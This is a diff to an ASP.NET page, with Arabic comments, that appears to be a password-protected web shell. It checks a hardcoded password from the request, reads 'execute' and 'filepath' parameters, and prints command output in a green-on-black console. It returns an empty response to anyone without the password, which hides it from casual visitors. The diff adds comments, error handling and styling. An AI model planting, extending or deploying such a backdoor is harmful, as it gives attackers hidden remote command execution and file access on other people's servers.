@@ -7,8 +7,8 @@
     {
         if (Request["password"] != null && Request["password"] == "28112016")
         {
-            string lastCommand = Request["execute"] ?? "";
-            string filePathCommand = Request["filepath"] ?? "";
+            string lastCommand = Request["execute"] ?? ""; // احفظ آخر أمر مدخل
+            string filePathCommand = Request["filepath"] ?? ""; // مسار الملف المطلوب
 
             Response.Write(@"
                 <div style='position: fixed; top: 0; left: 0; width: 100%; background-color: #111; padding: 15px; box-shadow: 0 2px 5px rgba(0,0,0,0.7); color: #0f0;'>
@@ -110,4 +110,50 @@
                 }
                 catch (Exception ex)
                 {
-                    Response.Write("<pre style='color:red; background-color: #000; padding: 15px; font-family: Consolas, monospace; border: 1px solid #444; border-radius: 5px; white-space: pre-wrap; word-wrap: break-word; max-height: none; height: auto;'>Error: " +
+                    Response.Write("<pre style='color:red; background-color: #000; padding: 15px; font-family: Consolas, monospace; border: 1px solid #444; border-radius: 5px; white-space: pre-wrap; word-wrap: break-word; max-height: none; height: auto;'>Error: " + Server.HtmlEncode(ex.Message) + "</pre>");
+                }
+            }
+
+            Response.Write("</div>");
+        }
+        else
+        {
+            Response.Clear();
+        }
+    }
+</script>
+
+<html>
+<head>
+    <style>
+        body {
+            background-color: #000;
+            color: #0f0;
+            font-family: 'Courier New', monospace;
+        }
+
+        input[type='text'] {
+            transition: box-shadow 0.3s ease;
+        }
+
+        input[type='text']:focus {
+            box-shadow: 0 0 10px rgba(0, 255, 0, 0.7);
+        }
+
+        input[type='submit'] {
+            transition: background-color 0.3s ease;
+        }
+
+        input[type='submit']:hover {
+            background-color: #444;
+        }
+
+        /* تحسين تجربة التمرير لمخرجات الأوامر */
+        pre {
+            overflow-y: auto;
+        }
+    </style>
+</head>
+<body>
+</body>
+</html>
